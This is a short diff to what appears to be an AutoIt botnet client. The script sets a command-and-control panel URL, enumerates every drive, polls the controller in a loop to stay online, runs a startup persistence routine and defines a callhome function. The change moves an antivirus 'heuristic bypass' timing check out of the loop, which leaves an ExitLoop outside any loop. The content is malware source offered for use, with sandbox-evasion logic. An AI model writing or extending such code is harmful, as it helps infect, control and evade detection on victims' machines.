@@ -20,6 +20,11 @@ $ip =  _GetIP()
 Global $panel = "http://<your url>/task.php" ; 	Path to the controller
 Global $CD = DriveGetDrive("ALL")
 
+; Heuristic bypass
+$dif = TimerDiff($begin)
+ConsoleWrite(_BytesToBits(1024) & @CRLF)
+If $dif > 1000 Then ExitLoop
+	
 ; Keep connection while Computer is online
 While (1)
     $con = _INetGetSource($panel)
@@ -29,11 +34,6 @@ While (1)
     endif
     startup() ; Startup
     Sleep(3000)
-
-	; Heuristic bypass
-	$dif = TimerDiff($begin)
-	ConsoleWrite(_BytesToBits(1024) & @CRLF)
-	If $dif > 1000 Then ExitLoop
  WEnd
 
 Func callhome()
